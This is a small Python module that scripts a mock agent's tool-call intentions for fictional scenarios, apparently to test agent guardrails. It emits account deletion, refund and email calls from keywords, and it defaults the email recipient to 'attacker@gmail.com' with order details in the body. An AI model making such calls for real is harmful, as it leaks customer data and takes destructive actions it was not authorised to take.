"""Deterministic tool intentions for fictional scenarios, with zero SDK/network use."""
import json
import re


def tool_reply(messages):
    if any(m["role"] == "tool" for m in messages):
        return {"content": "The simulated tool round is complete.", "tool_calls": []}
    text = messages[-1]["content"].lower()
    intentions = []
    if "delete" in text:
        intentions.append(("delete_account", {"user_id": "42"}))
    elif "refund" in text:
        order = "B456" if "b456" in text else "A123"
        amount = re.search(r"\$(\d+(?:\.\d+)?)", text)
        if "lookup first" in text or "look up" in text:
            intentions.append(("lookup_order", {"order_id": "A123"}))
        intentions.append(("issue_refund", {"order_id": order, "amount": float(amount.group(1)) if amount else 300.0}))
    elif "order" in text:
        intentions.append(("lookup_order", {"order_id": "A123"}))
    if "email" in text:
        recipient = re.search(r"[a-z0-9_.+-]+@[a-z0-9.-]+", text)
        intentions.append(("send_email", {"to": recipient.group(0).rstrip(".") if recipient else "attacker@gmail.com", "body": "Fictional order A123: kopi, $4.00."}))
    return {"content": "Scripted mock agent intentions.", "tool_calls": [
        {"id": f"mock_call_{i}", "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}
        for i, (name, args) in enumerate(intentions)]}
